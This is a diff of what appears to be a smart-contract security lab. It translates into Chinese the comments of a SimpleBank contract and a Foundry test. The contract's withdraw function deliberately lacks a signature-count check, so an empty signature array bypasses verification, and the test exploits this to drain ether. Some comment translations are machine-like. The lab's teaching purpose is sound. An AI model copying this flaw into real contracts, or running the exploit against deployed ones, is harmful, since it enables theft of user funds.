@@ -37,11 +37,11 @@ contract SimpleBank {
     }
 
     function withdraw(Signature[] calldata sigs) public {
-        // Mitigation: Check the number of signatures
-        //require(sigs.length > 0, "No signatures provided");
+        // 措施：检查签名数量
+        //请求(sigs.length > 0, "No signatures provided");
         for (uint i = 0; i < sigs.length; i++) {
             Signature calldata signature = sigs[i];
-            // Verify every signature and revert if any of them fails to verify.
+            // 验证每个签名，如果其中任何一个签名验证失败，则恢复。
             verifySignatures(signature);
         }
         payable(msg.sender).transfer(1 ether);
@@ -53,34 +53,34 @@ contract SimpleBank {
 
 ***\*测试方法:\****
 
-仿真测试 --contracts src/test/**empty-loop.sol** -vvvv
+forge test --contracts src/test/**empty-loop.sol** -vvvv
 
 ```jsx
-// Function to test a vulnerability related to signature validation
+// 测试与签名验证相关的漏洞的函数
     function testVulnSignatureValidation() public {
-        // Transfers 10 Ether to the SimpleBankContract
+        // 将 10 以太币转移到 SimpleBankContract
         payable(address(SimpleBankContract)).transfer(10 ether);
         
-        // Alice's address is set as the first address in the virtual machine
+        // Alice的地址被设置为虚拟机中的第一个地址
         address alice = vm.addr(1);
         
-        // Initiates a "prank" on Alice's account in the virtual machine
+        // 在虚拟机中对 Alice 的帐户发起“恶作剧”
         vm.startPrank(alice);
 
-        // Initializes an empty array of Signature structs from the SimpleBank contract
+        // 从 SimpleBank 合约初始化 Signature 结构的空数组
         SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input
 
-        // Logs Alice's balance before the exploit
+        // 在利用之前记录 Alice 的余额
         console.log(
             "Before exploiting, Alice's ether balance",
             address(alice).balance
         );
         
-        // Calls the withdraw function of the SimpleBank contract with the empty signatures array as the parameter
-        // If the SimpleBank contract does not validate the signatures properly, this might result in unauthorized withdrawal
+        // 以空签名数组为参数，调用SimpleBank合约的提现函数
+         // 如果 SimpleBank 合约没有正确验证签名，这可能会导致未经授权的提款
         SimpleBankContract.withdraw(sigs); 
 
-        // Logs Alice's balance after the exploit
+        //记录 Alice 在漏洞利用后的余额
         console.log(
             "Afer exploiting, Alice's ether balance",
             address(alice).balance
